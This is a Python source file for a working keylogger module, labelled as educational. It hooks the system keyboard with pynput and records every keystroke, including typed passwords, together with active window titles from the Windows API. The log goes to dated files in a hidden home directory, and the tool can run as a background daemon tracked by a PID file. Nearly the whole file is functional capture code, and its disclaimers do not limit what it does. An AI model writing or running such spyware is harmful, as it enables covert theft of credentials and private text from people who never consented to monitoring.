"""
Listener module - Core keystroke capture engine.

Provides the Keylogger class that hooks into the system keyboard
using pynput and logs all keystrokes with timestamps and active
window information. Intended for educational security research.

For educational use only. Do not use on systems you don't own.
"""

import os
import sys
import time
import json
import atexit
from datetime import datetime
from pathlib import Path
from threading import Thread, Event

from pynput import keyboard


LOG_DIR = Path.home() / ".keylog_edu"
PID_FILE = LOG_DIR / "daemon.pid"
STATE_FILE = LOG_DIR / "state.json"


def _ensure_log_dir():
    """Create the log directory if it doesn't exist."""
    LOG_DIR.mkdir(parents=True, exist_ok=True)


def _get_log_path():
    """Return the log file path for today's date."""
    _ensure_log_dir()
    date_str = datetime.now().strftime("%Y-%m-%d")
    return LOG_DIR / f"keys_{date_str}.log"


def _get_active_window_title():
    """Return the title of the currently active window (Windows only)."""
    try:
        import ctypes
        from ctypes import wintypes

        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd) + 1
        buf = ctypes.create_unicode_buffer(length)
        user32.GetWindowTextW(hwnd, buf, length)
        return buf.value if buf.value else "Unknown"
    except Exception:
        return "Unknown"


class Keylogger:
    """
    Educational keylogger that captures keystrokes with timestamps.

    Features:
        - Logs all key presses with timestamps
        - Tracks active application window
        - Handles special keys (Enter, Backspace, Shift, etc.)
        - Daily log rotation
        - Background daemon mode

    Attributes:
        running (bool): Whether the listener is active.
        _listener (pynput.keyboard.Listener): The pynput listener thread.
        _current_window (str): Last known active window title.
        _stop_event (threading.Event): Event to signal shutdown.
    """

    def __init__(self):
        self.running = False
        self._listener = None
        self._current_window = "Unknown"
        self._stop_event = Event()

    def start(self):
        """Start capturing keystrokes in a background thread."""
        if self.running:
            print("[!] Keylogger is already running.")
            return

        _ensure_log_dir()
        self._stop_event.clear()
        self.running = True

        self._listener = keyboard.Listener(
            on_press=self._on_press,
            suppress=False
        )
        self._listener.start()

        self._save_state({"pid": os.getpid(), "running": True})

        # Save PID for daemon tracking
        with open(PID_FILE, "w") as f:
            f.write(str(os.getpid()))

        atexit.register(self.stop)
        print(f"[+] Keylogger started. Logging to: {LOG_DIR}")
        print("[!] WARNING: This logs ALL keystrokes. Use ethically and only on your own systems.")

    def stop(self):
        """Stop the keylogger listener gracefully."""
        if not self.running:
            return

        self._stop_event.set()
        if self._listener and self._listener.running:
            self._listener.stop()
        self.running = False
        self._save_state({"pid": None, "running": False})
        if PID_FILE.exists():
            PID_FILE.unlink()
        print("[+] Keylogger stopped.")

    def _on_press(self, key):
        """Callback for each key press event."""
        try:
            if self._stop_event.is_set():
                return False

            timestamp = datetime.now().isoformat()
            window = _get_active_window_title()

            # Update on window change
            if window != self._current_window:
                self._current_window = window
                self._write_log(f"\n--- [Window: {window}] ---\n", timestamp)

            # Handle regular vs special keys
            if hasattr(key, 'char') and key.char is not None:
                self._write_log(key.char, timestamp)
            else:
                special = self._format_special_key(key)
                if special:
                    self._write_log(special, timestamp)

        except Exception as e:
            self._write_log(f"[Error: {e}]", datetime.now().isoformat())

    def _format_special_key(self, key):
        """Convert a special key to a human-readable string."""
        mapping = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BKSP]",
            keyboard.Key.delete: "[DEL]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT_R]",
            keyboard.Key.ctrl: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL_R]",
            keyboard.Key.alt: "[ALT]",
            keyboard.Key.alt_r: "[ALT_R]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.home: "[HOME]",
            keyboard.Key.end: "[END]",
            keyboard.Key.page_up: "[PGUP]",
            keyboard.Key.page_down: "[PGDN]",
            keyboard.Key.insert: "[INS]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
            keyboard.Key.print_screen: "[PRTSC]",
            keyboard.Key.scroll_lock: "[SCRLK]",
            keyboard.Key.pause: "[PAUSE]",
            keyboard.Key.menu: "[MENU]",
        }
        return mapping.get(key, f"[{str(key).replace('Key.', '').upper()}]")

    def _write_log(self, text, timestamp):
        """Write a key event to the daily log file."""
        log_path = _get_log_path()
        try:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(text)
        except Exception as e:
            print(f"[-] Log write error: {e}", file=sys.stderr)

    def _save_state(self, state):
        """Persist current state to a JSON file."""
        try:
            with open(STATE_FILE, "w") as f:
                json.dump(state, f)
        except Exception:
            pass

    @staticmethod
    def is_running():
        """Check if a keylogger instance is running via PID file."""
        if not PID_FILE.exists():
            return False
        try:
            with open(PID_FILE) as f:
                pid = int(f.read().strip())
            # Check if process exists (Windows)
            import psutil
            return psutil.pid_exists(pid)
        except Exception:
            return False

    @staticmethod
    def get_logs():
        """Return a sorted list of log files."""
        _ensure_log_dir()
        log_files = sorted(LOG_DIR.glob("keys_*.log"))
        return log_files
